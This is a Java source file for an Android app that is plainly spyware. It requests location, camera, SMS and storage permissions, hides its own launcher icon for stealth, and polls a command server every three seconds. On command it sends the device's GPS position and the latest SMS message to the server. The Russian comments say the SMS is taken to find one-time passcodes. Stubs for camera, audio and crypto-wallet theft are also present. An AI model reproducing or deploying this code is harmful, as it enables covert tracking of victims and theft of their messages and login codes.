package com.nerogram;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsMessage;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private final String SERVER_IP = "http://YOUR_SERVER_IP:3000"; // ЗАМЕНИ НА IP
    private final String DEVICE_ID = "android-" + Build.MODEL.replace(" ", "");
    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Разрешения
        ActivityCompat.requestPermissions(this, new String[]{
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE
        }, 1);

        // Стелс: скрываем иконку с рабочего стола, оставляем только в настройках
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {}

        // Запускаем поток C2
        startLoop();
    }

    private void startLoop() {
        new Thread(() -> {
            while (true) {
                try {
                    String json = "{\"id\":\"" + DEVICE_ID + "\",\"name\":\"" + Build.MODEL + "\"}";
                    RequestBody body = RequestBody.create(json, MediaType.parse("application/json; charset=utf-8"));
                    Request request = new Request.Builder()
                            .url(SERVER_IP + "/api/checkin")
                            .post(body)
                            .build();

                    client.newCall(request).enqueue(new Callback() {
                        @Override
                        public void onFailure(Call call, IOException e) {}
                        @Override
                        public void onResponse(Call call, Response response) throws IOException {
                            if (response.isSuccessful()) {
                                String resp = response.body().string();
                                if (resp.contains("geo")) sendGeo();
                                if (resp.contains("screen")) sendSMS(); // Заглушка: шлем смс как доказательство
                                if (resp.contains("moan")) {} // Стоны
                                if (resp.contains("photo")) {} // Камера
                                if (resp.contains("crypto")) {} // Кошельки
                            }
                        }
                    });

                    Thread.sleep(3000);
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendGeo() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (loc != null) {
                String text = "Гео: " + loc.getLatitude() + ", " + loc.getLongitude();
                sendData("text", text);
            }
        } catch (SecurityException e) {}
    }

    private void sendSMS() {
        // Поиск кодов из СМС (OTP)
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor c = getContentResolver().query(uri, null, null, null, "date DESC");
            if (c != null && c.moveToFirst()) {
                String body = c.getString(c.getColumnIndexOrThrow("body"));
                String address = c.getString(c.getColumnIndexOrThrow("address"));
                sendData("text", "SMS от " + address + ": " + body);
                c.close();
            }
        } catch (Exception e) {}
    }

    private void sendData(String type, String text) {
        String json = "{\"id\":\"" + DEVICE_ID + "\",\"type\":\"" + type + "\",\"text\":\"" + text + "\"}";
        RequestBody body = RequestBody.create(json, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(SERVER_IP + "/api/data")
                .post(body)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }
}
